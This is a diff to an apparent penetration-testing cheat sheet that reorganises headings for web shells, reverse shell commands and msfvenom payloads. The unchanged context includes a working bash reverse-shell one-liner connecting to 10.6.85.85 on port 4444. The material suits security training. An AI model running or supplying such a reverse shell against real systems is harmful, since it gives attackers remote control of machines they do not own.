@@ -5,6 +5,9 @@
   * [Web shells](#web-shells)
   * [Debugging Shells](#debugging-shells)
   * [Reverse shell commands](#reverse-shell-commands)
+    + [Bash](#bash)
+    + [netcat](#netcat)
+    + [other languages](#other-languages)
   * [Msfvenom Payloads](#msfvenom-payloads)
   * [Upgrading to a pseudo terminal / TTY](#upgrading-to-a-pseudo-terminal---tty)
 
@@ -27,7 +30,8 @@ No path variable? Need absolute path
     /bin/bash -c 'id'   
 
 ## Reverse shell commands  
-### Bash (requires /dev/tcp support, primarily found in RedHat/Debian distros):  
+### Bash     
+requires /dev/tcp support, primarily found in RedHat/Debian distros:          
 One bash version (compromised account's shell must be bash; does not work via www-data):  
 
     bash -i >& /dev/tcp/10.6.85.85/4444 0>&1   
